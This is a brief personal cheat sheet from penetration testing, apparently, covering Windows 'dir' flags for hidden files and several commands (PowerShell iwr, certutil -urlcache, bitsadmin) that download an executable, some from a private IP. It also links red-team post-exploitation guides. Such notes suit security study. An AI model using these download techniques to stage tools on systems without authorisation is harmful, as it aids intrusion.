

## Basic commands



all directory and its hidden files

```
dir /a /b
```

- `/a`
	- Basically just shows me everything thats hidden
- `/b`
	- Removes all of the headers when doing dir



# File transfers


## Using powershell

```
powershell.exe iwr -uri 192.168.1.2/putty.exe -o C:\Temp\putty.exe
```

```
certutil -urlcache -f http://192.168.1.2/putty.exe putty.exe
```

```
certutil -urlcache -f http://192.168.1.2/putty.exe putty.exe
```

```
bitsadmin /transfer job https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe C:\Temp\putty.exe
```




https://www.exploit-db.com/docs/english/46515-file-transfer-skills-in-the-red-team-post-penetration-test.pdf
https://www.hackingarticles.in/file-transfer-cheatsheet-windows-and-linux/






